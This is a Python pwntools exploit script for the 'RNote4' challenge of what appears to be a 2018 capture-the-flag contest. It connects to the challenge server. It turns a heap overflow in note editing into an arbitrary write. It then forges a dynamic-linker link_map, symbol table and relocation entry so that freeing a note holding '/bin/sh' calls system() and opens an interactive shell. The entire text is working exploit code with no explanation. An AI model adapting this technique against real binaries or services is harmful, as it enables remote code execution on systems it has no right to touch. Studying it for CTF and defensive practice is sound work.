from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

file = "./RNote4"
bin = ELF(file)

libc = ELF("./libc.so.6")

env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./libc.so.6")}

#conn = process([file, "100"], env=env)
conn = remote("rnote4.2018.teamrois.cn", 6767)
#gdb.attach(conn)

def add(size, content):
    conn.send("\x01")
    conn.send(chr(size))
    conn.send(content)

def edit(idx, size, content):
    conn.send("\x02")
    conn.send(chr(idx))
    conn.send(chr(size))
    conn.send(content)

def delete(idx):
    conn.send("\x03")
    conn.send(chr(idx))

add(0x10, "a"*0x10) # 0
add(0x10, "a"*0x10) # 1
add(0x10, "/bin/sh".ljust(0x10, "\x00")) # 2

def a_write(addr, val):
    assert(len(val) < 0x100)
    edit(0, 0x30, "a"*0x10 + p64(0) + p64(21) + p64(10) + p64(addr))
    edit(1, len(val), val)

OVERWRITE_ADDRESS = 0x000000000602008 # Link map address

LINKMAP_ADDR = 0x602150
RELOC_ADDR = LINKMAP_ADDR + 0x200
STRTAB_ADDR = RELOC_ADDR + 0x200
SYMTAB_ADDR = STRTAB_ADDR + 0x200

offset_system_from_read = libc.symbols['system'] - libc.symbols['read']

linkmap = p64(offset_system_from_read, sign="signed") + \
          "".ljust(0x60, "\x00") + \
          p64(STRTAB_ADDR) + \
          p64(SYMTAB_ADDR) + \
          p64(0)*16 + \
          p64(RELOC_ADDR)

# sym->st_value = got of read
symtab = p64(0) + \
         p64(bin.got['read'] - 8)

reloc = p64(0) + \
        p64(RELOC_ADDR + 0x10) + \
        p64(RELOC_ADDR + 0x100 - offset_system_from_read) + \
        p64(7)

a_write(OVERWRITE_ADDRESS, p64(LINKMAP_ADDR))
a_write(LINKMAP_ADDR, linkmap[:0x90])
a_write(LINKMAP_ADDR + 0x90, linkmap[0x90:])
a_write(SYMTAB_ADDR, symtab)
a_write(RELOC_ADDR, reloc)
pause()

# Freeing
delete(2)

conn.interactive()
